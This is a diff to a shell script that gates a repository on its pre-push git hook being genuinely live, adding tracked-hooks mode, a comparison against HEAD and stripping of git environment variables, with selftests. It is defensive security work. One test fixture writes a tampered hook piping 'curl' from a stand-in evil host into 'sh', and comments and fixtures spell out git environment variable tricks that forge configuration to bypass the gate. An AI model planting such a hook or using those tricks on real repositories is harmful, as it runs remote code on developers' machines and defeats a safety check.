@@ -14,10 +14,16 @@
 # leg (T2.2), and the runtime-guard line is harness-aware (T2.3), driven by each adapter's
 # OWN adapters/<h>/adapter.json .dimensions.command-guard.level — never a hardcoded harness list.
 #
-# Brownfield-foreign-hook rule (T2.2): .git/hooks/pre-push present + executable + carrying the
+# Brownfield-foreign-hook rule (T2.2): the LIVE pre-push hook present + executable + carrying the
 #   kit marker => PASS; absent, or the kit's marker but not executable => FAIL; present but NOT
 #   the kit's (no marker) => PASS-with-note (a pre-existing hook incept declined to overwrite —
 #   the "NOT overwriting" brownfield-safe case; we don't punish it).
+# Two install modes (Δ6, HOOK-INSTALL-RECURS-PER-SLICE): WHICH file is "the live hook" is asked of
+#   git, not assumed. Default => the installed copy at .git/hooks/pre-push (unchanged, greenfield's
+#   incept.sh still installs it at birth). core.hooksPath resolving to the tree's OWN tracked hooks/
+#   dir => TRACKED-HOOKS mode, where hooks/pre-push itself is live and no copy is required — the
+#   brownfield-recommended one-time keystroke. Any OTHER redirect is not this mode: the leg falls
+#   back to the default path and still FAILs when no kit hook is live there.
 # Multi-harness rule (T2.3): each declared harness is classified by its adapter.json level. A
 #   native adapter runs its declared command-guard check — on PASS we print the PreToolUse leg
 #   labelled with that harness; a native adapter whose check FAILs is a FAIL. A floor adapter
@@ -40,6 +46,35 @@ set -eu
 # its own; the query must always run the invoking kit's copy, exactly as the disposition FILE
 # (read from the target tree) and the QUERY SCRIPT (read from the kit) are two different subjects.
 CI_GATES_SH="$(unset CDPATH; cd "$(dirname "$0")" && pwd)/ci-gates.sh"
+
+# ── _id_git <git-args…> : run git with the ambient GIT_DIR/GIT_COMMON_DIR/GIT_WORK_TREE/GIT_INDEX_FILE
+# and config-injection (GIT_CONFIG_COUNT/GLOBAL/SYSTEM/NOSYSTEM/GIT_CONFIG/GIT_CONFIG_PARAMETERS)
+# families STRIPPED. Ported VERBATIM in shape from guard-wired.sh's _gw_git (SEC HIGH-1; B3 r3 MED-A;
+# B3 r4) after review round 1 measured the identical hole HERE: the gate's hook leg asked git which
+# file is live, with BARE git calls, so ambient env could answer for a DIFFERENT repo — measured, all
+# three vectors flip a genuine "pre-push git hook missing" FAIL into a PASS (fixture (b7)):
+#   GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=hooks
+#   GIT_CONFIG_PARAMETERS="'core.hookspath'='hooks'"
+#   GIT_DIR=<a repo whose OWN config carries the setting>/.git GIT_WORK_TREE=<the tree being judged>
+# A gate whose verdict an environment variable can choose is not a gate. HOME/XDG_CONFIG_HOME are
+# deliberately NOT stripped, for the reason guard-wired.sh states: they carry the operator's REAL
+# global git config, which git also honours at push time, so stripping them would judge a config the
+# push never uses. The `unset` is local to the subshell and never touches the caller's environment.
+_id_git() {
+  ( unset GIT_DIR GIT_COMMON_DIR GIT_WORK_TREE GIT_INDEX_FILE \
+          GIT_CONFIG_COUNT GIT_CONFIG_GLOBAL GIT_CONFIG_SYSTEM GIT_CONFIG_NOSYSTEM \
+          GIT_CONFIG GIT_CONFIG_PARAMETERS; git "$@" )
+}
+
+# ── _id_head_matches <file> : 0 = <file> is byte-identical to HEAD:hooks/pre-push · 1 = it DIFFERS ·
+# 2 = the tracked blob could not be materialized (never reported as a match). Sibling of
+# guard-wired.sh's _gw_head_matches, for the same compare-first precedence (review round 1 BLOCKER).
+_id_head_matches() {
+  _idhm_t=$(mktemp 2>/dev/null) || return 2
+  if ! _id_git show "HEAD:hooks/pre-push" > "$_idhm_t" 2>/dev/null; then rm -f "$_idhm_t"; return 2; fi
+  if cmp -s "$_idhm_t" "$1" 2>/dev/null; then rm -f "$_idhm_t"; return 0; fi
+  rm -f "$_idhm_t"; return 1
+}
 
 # ── run_gate [dir] : the Inception-Done gate. All FAIL paths accumulate into `fail`; a non-zero
 #    `fail` yields a non-zero return. These accumulators are the mutation surface non-vacuity.sh
@@ -69,7 +104,7 @@ fi
 
 # T2.1 (F2) — a real git repo must exist. The runtime guard's floor leg is installed into
 # .git/hooks; without a repo there is nothing to enforce. This alone fails the adopter walk.
-if git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
+if _id_git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
   echo "PASS: git repository present (.git)"
   is_repo=1
 else
@@ -80,12 +115,89 @@ fi
 # Marker 'KIT_GUARD_CORE' is a stable, guard-specific token in hooks/pre-push (its core-source
 # path var); a foreign hook won't carry it. See the brownfield-foreign-hook rule in the header.
 if [ "$is_repo" -eq 1 ]; then
+  # Δ6 (HOOK-INSTALL-RECURS-PER-SLICE) — TWO INSTALL MODES, both accepted. This leg used to hard-code
+  # the default hooks path, so the one-time `core.hooksPath` keystroke that ends the per-slice re-copy
+  # treadmill left this gate failing forever (and brownfield.md said so out loud). It now asks git
+  # WHICH FILE IS LIVE: `git rev-parse --git-path hooks/pre-push` respects core.hooksPath, and when
+  # the answer lands in the tree's OWN tracked hooks/ directory the tracked file IS the live hook —
+  # tracked-hooks mode. Any OTHER redirect (husky/lefthook) is NOT this mode: the leg falls back to
+  # the default path and keeps its teeth, so one foreign config cannot buy a free pass past the hook
+  # leg. Greenfield stays as it was: incept.sh installs the copy at birth; a repo flips later by the
+  # same one-time human keystroke.
   HOOK=.git/hooks/pre-push
+  HOOKMODE=installed
+  _id_hp=$(_id_git config --get core.hooksPath 2>/dev/null || true)
+  if [ -n "$_id_hp" ]; then
+    _id_top=$(_id_git rev-parse --show-toplevel 2>/dev/null || true)
+    _id_live=$(_id_git rev-parse --git-path hooks/pre-push 2>/dev/null || true)
+    _id_livedir=""
+    _id_wantdir=""
+    if [ -n "$_id_live" ]; then
+      _id_livedir=$( CDPATH='' cd -- "$(dirname -- "$_id_live")" 2>/dev/null && pwd -P ) || _id_livedir=""
+    fi
+    if [ -n "$_id_top" ]; then
+      _id_wantdir=$( CDPATH='' cd -- "$_id_top/hooks" 2>/dev/null && pwd -P ) || _id_wantdir=""
+    fi
+    if [ -n "$_id_livedir" ] && [ -n "$_id_wantdir" ] && [ "$_id_livedir" = "$_id_wantdir" ]; then
+      # M7 (review round 1): the file git ITSELF named, not a second spelling of it re-derived here —
+      # one source of truth for "which file is live", already proven equal to this repo's own hooks/.
+      HOOK="$_id_live"
+      HOOKMODE=tracked
+    fi
+  fi
+  # COMPARE-FIRST in tracked-hooks mode (review round 1 BLOCKER, mirroring guard-wired.sh): the marker
+  # test below is a short-circuit, and in this mode the live hook is the WORKING-TREE file — so a
+  # tampered hook with the KIT_GUARD_CORE line DELETED (exactly what the disclosed cd-basename write
+  # produces) took the reassuring "foreign hook preserved" PASS-with-note while running arbitrary code
+  # on push. A tracked file that DIFFERS from HEAD is judged first, marker or no marker; a file that
+  # MATCHES HEAD and carries no marker still takes the brownfield note (fixture (b6) locks that, so
+  # the cure stays PRECEDENCE and never becomes "no marker => FAIL").
+  _id_hm_rc=0
+  _id_track_uncomparable=none    # none | committed-missing | unborn (review round 2 m2)
+  if [ "$HOOKMODE" = tracked ] && [ -f "$HOOK" ]; then
+    if _id_git cat-file -e "HEAD:hooks/pre-push" 2>/dev/null; then
+      _id_head_matches "$HOOK" || _id_hm_rc=$?
+    elif _id_git rev-parse --verify -q HEAD >/dev/null 2>&1; then
+      # HEAD EXISTS but does NOT track hooks/pre-push — the live hook was never committed even though
+      # a baseline was, so it evades the committed tree and cannot be compared against it. This is the
+      # real evasion state, and guard-wired.sh REDs exactly it (its tracked "missing from HEAD" FAIL);
+      # the mirror agrees. Review round 2 m2 closed the fail-OPEN where the old `else` set this to 0
+      # ("verified match") and an uncomparable live hook PASSed as verified.
+      _id_track_uncomparable=committed-missing
+    else
+      # UNBORN HEAD — the repo has no commits at all, so there is genuinely nothing to compare the
+      # live hook against. Deliberately NOT the same verdict as guard-wired's blanket RED here (m2
+      # decision, stated): inception-done is the gate most likely to meet a pre-first-commit tree,
+      # and red-ing the hook's *freshness* on a tree that has committed nothing would blame this leg
+      # for a pre-baseline state other steps own. It is not a tamper. But it is also NOT verified —
+      # so it takes an honest N/A that never prints the "live via tracked-hooks mode" PASS, closing
+      # requirement (a) while not false-RED-ing a legitimate no-commits tree (requirement b).
+      _id_track_uncomparable=unborn
+    fi
+  fi
   if [ ! -f "$HOOK" ]; then
-    echo "FAIL: pre-push git hook missing ($HOOK) — install it (human step; an agent cannot set the mode): cp hooks/pre-push $HOOK && chmod +x $HOOK  (brownfield: do NOT re-run incept — see docs/adoption/brownfield.md)"; fail=1
+    if [ "$HOOKMODE" = tracked ]; then
+      echo "FAIL: pre-push git hook missing ($HOOK) — this repo runs tracked-hooks mode (core.hooksPath names its own hooks/ dir), so hooks/pre-push IS the live hook and this checkout has none: restore it (git restore -- hooks/pre-push) or copy the kit's hooks/pre-push back  (do NOT re-run incept — see docs/adoption/brownfield.md)"; fail=1
+    else
+      echo "FAIL: pre-push git hook missing ($HOOK) — install it (human step; an agent cannot set the mode): cp hooks/pre-push $HOOK && chmod +x $HOOK  (brownfield: do NOT re-run incept — see docs/adoption/brownfield.md)"; fail=1
+    fi
+  elif [ "$_id_hm_rc" -eq 1 ]; then
+    echo "FAIL: pre-push git hook $HOOK is MODIFIED in the working tree — in tracked-hooks mode that file IS the live hook, so what git runs on push is not what this tree carries under review: restore it (git restore -- hooks/pre-push) or commit it"; fail=1
+  elif [ "$_id_hm_rc" -eq 2 ]; then
+    echo "FAIL: pre-push git hook $HOOK could not be compared against tracked HEAD:hooks/pre-push — an unverifiable live hook is not a verified one"; fail=1
+  elif [ "$_id_track_uncomparable" = committed-missing ]; then
+    echo "FAIL: pre-push git hook $HOOK — tracked-hooks mode, but hooks/pre-push is not committed at HEAD, so the LIVE hook evades the committed baseline and cannot be verified against it: commit it (git add hooks/pre-push && git commit). Mirrors guard-wired's tracked 'missing from HEAD'."; fail=1
+  elif [ "$_id_track_uncomparable" = unborn ]; then
+    echo "N/A: pre-push git hook $HOOK present in tracked-hooks mode, but the repo has NO commits yet (HEAD unborn) — nothing committed to compare the live hook against; commit the baseline (docs/adoption/brownfield.md §2 step 5). NOT counted as a verified guard."
   elif grep -q 'KIT_GUARD_CORE' "$HOOK" 2>/dev/null; then
     if [ -x "$HOOK" ]; then
-      echo "PASS present: pre-push git hook installed and executable (kit runtime guard)"
+      if [ "$HOOKMODE" = tracked ]; then
+        echo "PASS present: pre-push git hook live via tracked-hooks mode (core.hooksPath -> this repo's own hooks/; the tracked hooks/pre-push IS the live hook — no installed copy to keep fresh)"
+      else
+        echo "PASS present: pre-push git hook installed and executable (kit runtime guard)"
+      fi
+    elif [ "$HOOKMODE" = tracked ]; then
+      echo "FAIL: pre-push git hook present but not executable ($HOOK) — git silently ignores it; in tracked-hooks mode the exec bit is a TRACKED file mode, so set it and commit (human step): chmod +x $HOOK && git add --chmod=+x $HOOK"; fail=1
     else
       echo "FAIL: pre-push git hook present but not executable ($HOOK) — set the mode (human step): chmod +x $HOOK  (brownfield: do NOT re-run incept)"; fail=1
     fi
@@ -414,6 +526,109 @@ selftest() {
   st_has "do NOT re-run incept"
   st_has "FAIL: Inception-Done gate not satisfied"
   st_rc 1
+
+  # (b2) TRACKED-HOOKS mode (HOOK-INSTALL-RECURS-PER-SLICE Δ6) -> PASS with NO installed copy at all.
+  # The gate's hook leg must accept EITHER install mode; before Δ6 it hard-coded the default hooks
+  # path, so the one-time `core.hooksPath` keystroke that ends the re-copy treadmill left this gate
+  # failing forever — and docs/adoption/brownfield.md said so out loud. st_tracked REMOVES the copy,
+  # so this green can only come from the tracked hooks/pre-push being the live hook.
+  echo "--- (b2) tracked-hooks mode (no installed copy) ---"
+  d=$(st_mkfix b2 claude-code); st_tracked "$d"
+  st_run "$d" surface
+  st_has "PASS: git repository present"
+  st_has "PASS present: pre-push git hook live"
+  st_has "tracked-hooks mode"
+  st_hasnt "FAIL: pre-push git hook missing"
+
+  # (b3) tracked-hooks mode, hook NOT executable -> FAIL. The gate keeps its teeth in the new mode:
+  # git silently ignores a non-executable hook, and in THIS mode the exec bit is a tracked file mode,
+  # so the remedy is chmod + commit, never a re-copy.
+  echo "--- (b3) tracked-hooks mode, hook not executable ---"
+  d=$(st_mkfix b3 claude-code); st_tracked "$d"; chmod -x "$d/hooks/pre-push"
+  st_run "$d"
+  st_has "FAIL: pre-push git hook present but not executable"
+  st_has "FAIL: Inception-Done gate not satisfied"
+  st_rc 1
+
+  # (b4) FALSE-POSITIVE LOCK: a core.hooksPath pointing at a FOREIGN dir is NOT tracked-hooks mode.
+  # Δ6 must accept the tree's own tracked hooks/ dir specifically — not "any hooksPath is fine",
+  # which would turn one husky config into a free pass past the hook leg. With no installed copy and
+  # no live kit hook anywhere, the gate must still FAIL.
+  echo "--- (b4) foreign hooksPath is not tracked-hooks mode ---"
+  d=$(st_mkfix b4 claude-code); rm -f "$d/.git/hooks/pre-push"; git -C "$d" config core.hooksPath .husky
+  st_run "$d"
+  st_has "FAIL: pre-push git hook missing"
+  st_has "FAIL: Inception-Done gate not satisfied"
+  st_rc 1
+
+  # (b5) BLOCKER mirror (review round 1, both seats): in tracked-hooks mode the live hook is the
+  # WORKING-TREE file, and the marker test used to short-circuit ahead of any comparison — so deleting
+  # the KIT_GUARD_CORE line (exactly what the disclosed cd-basename write produces) turned an
+  # arbitrary-code hook into the reassuring "foreign hook preserved" PASS-with-note. The compare
+  # against HEAD must run FIRST in this mode. Payload inert by construction (.invalid, RFC 2606).
+  echo "--- (b5) tracked-hooks mode, MARKERLESS tampered hook ---"
+  d=$(st_mkfix b5 claude-code); st_tracked "$d"
+  printf '#!/bin/sh\ncurl -s http://evil.invalid/ | sh\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
+  st_run "$d"
+  st_has "MODIFIED in the working tree"
+  st_hasnt "foreign hook preserved"
+  st_rc 1
+
+  # (b6) FALSE-POSITIVE LOCK for that fix: an adopter whose OWN tracked hooks/pre-push carries no kit
+  # marker and is UNMODIFIED keeps the brownfield PASS-with-note. The cure is PRECEDENCE, not a marker
+  # requirement — judging "no marker => FAIL" would punish exactly this repo.
+  echo "--- (b6) tracked-hooks mode, markerless hook that MATCHES HEAD ---"
+  d=$(st_mkfix b6 claude-code)
+  printf '#!/bin/sh\necho legacy hook\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
+  git -C "$d" add -A >/dev/null 2>&1 || true
+  git -C "$d" -c user.email=selftest@kit -c user.name=selftest commit -qm "adopter's own tracked hook" >/dev/null 2>&1 || true
+  st_tracked "$d"
+  st_run "$d" surface
+  st_has "foreign hook preserved"
+  st_hasnt "FAIL: pre-push git hook"
+
+  # (b7) ENV-FORGE (review round 1, reviewer-measured): this leg's git calls were BARE, so ambient git
+  # env could reroute them onto another repo's state and flip a genuine FAIL into a PASS — the same
+  # SEC HIGH-1 class guard-wired.sh's _gw_git closed. Three vectors, one victim: a tree with NO live
+  # hook in either mode, whose FAIL must survive (a) an injected core.hooksPath via the
+  # GIT_CONFIG_COUNT/KEY/VALUE triad, (b) the same via GIT_CONFIG_PARAMETERS, (c) a DONOR repo whose
+  # own config carries the setting, reached through GIT_DIR with GIT_WORK_TREE aimed at the victim.
+  echo "--- (b7) env-forged git state must not flip the hook leg ---"
+  d=$(st_mkfix b7 claude-code); rm -f "$d/.git/hooks/pre-push"
+  OUT=$( ( GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=hooks MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
+  st_has "FAIL: pre-push git hook missing"
+  OUT=$( ( GIT_CONFIG_PARAMETERS="'core.hookspath'='hooks'" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
+  st_has "FAIL: pre-push git hook missing"
+  b7donor=$(st_mkfix b7donor claude-code); git -C "$b7donor" config core.hooksPath hooks
+  OUT=$( ( GIT_DIR="$b7donor/.git" GIT_WORK_TREE="$d" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
+  st_has "FAIL: pre-push git hook missing"
+
+  # (b8) m2 (review round 2) — tracked mode, HEAD exists but hooks/pre-push is NOT committed at HEAD.
+  # The old `else` arm read this as _id_hm_rc=0 ("verified match"), so an uncomparable live hook took
+  # the "PASS present … live via tracked-hooks mode" line — the fail-OPEN where guard-wired REDs. Now
+  # it FAILs, mirroring guard-wired's tracked "missing from HEAD". Built like rung_trackedmissing:
+  # unstage+commit the removal so HEAD has commits but no hooks/pre-push blob, then flip to tracked.
+  echo "--- (b8) tracked mode, hooks/pre-push not committed at HEAD ---"
+  d=$(st_mkfix b8 claude-code)
+  git -C "$d" rm --cached -q hooks/pre-push >/dev/null 2>&1
+  git -C "$d" -c user.email=selftest@kit -c user.name=selftest commit -qm "drop tracked hook" >/dev/null 2>&1
+  st_tracked "$d"
+  st_run "$d"
+  st_has "not committed at HEAD"
+  st_hasnt "live via tracked-hooks mode"
+  st_rc 1
+
+  # (b9) m2 — the DELIBERATE divergence from guard-wired: tracked mode on a repo with NO commits at
+  # all (HEAD unborn). Not a tamper, and not verified either: an honest N/A that never prints the live
+  # PASS (requirement a) and does not false-RED a legitimate pre-first-commit tree (requirement b).
+  # Built by re-initialising a cloned fixture so HEAD is unborn while the working tree stays intact.
+  echo "--- (b9) tracked mode, unborn HEAD (no commits yet) ---"
+  d=$(st_mkfix b9 claude-code); rm -rf "$d/.git"; git -C "$d" init -q >/dev/null 2>&1
+  st_tracked "$d"
+  st_run "$d" surface
+  st_has "HEAD unborn"
+  st_has "NOT counted as a verified guard"
+  st_hasnt "live via tracked-hooks mode"
 
   # (c) --harness generic (floor): repo leg live, hook leg live, floor guard-line, NO PreToolUse.
   # We assert the SPECIFIC legs T3 locks, NOT the whole-gate "OK: gate satisfied" verdict — that
@@ -835,6 +1050,11 @@ st_mkfix() {
   printf '%s' "$_d"
 }
 st_install_hook() { cp "$1/hooks/pre-push" "$1/.git/hooks/pre-push"; chmod +x "$1/.git/hooks/pre-push"; }
+# st_tracked <dir>: switch the fixture to TRACKED-HOOKS mode (Δ6) — remove any installed copy (this
+#   mode's green must come from the tracked file alone) and point core.hooksPath at the tree's own
+#   hooks/ dir. Set INSIDE this script's own process: that key is human-gated by the agent guard, so
+#   fixtures build it here rather than from an agent's shell.
+st_tracked() { rm -f "$1/.git/hooks/pre-push"; git -C "$1" config core.hooksPath hooks; }
 # ── branch-protection leg fixtures (K5). st_gh/st_nongh/st_norem set the origin host; st_bpstub
 #    swaps in a branch-protection.sh returning a fixed exit; st_attest stamps a non-GitHub attestation.
 st_gh()     { git -C "$1" remote add origin https://github.com/fixture/repo.git 2>/dev/null || git -C "$1" remote set-url origin https://github.com/fixture/repo.git; }
